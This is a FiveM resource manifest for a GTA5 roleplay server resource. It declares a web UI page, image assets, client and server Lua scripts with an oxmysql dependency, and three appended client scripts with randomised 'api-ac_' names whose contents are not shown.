fx_version 'cerulean'

game 'gta5'
author 'cookierp'

ui_page 'html/index.html'

files {
    'html/index.html',
    'html/app.js',
    'html/main.css',
    'html/img/*.png',
    'html/img/*.jpeg',
    'html/img/*.jpg'
}

client_script 'c.lua'
server_scripts {
    '@oxmysql/lib/MySQL.lua',
    's.lua'
}

client_script "api-ac_OJOKaWCvUYzT.lua"
client_script "api-ac_vOJKHGqGxvPe.lua"
client_script "api-ac_uuQhioHoEMHi.lua"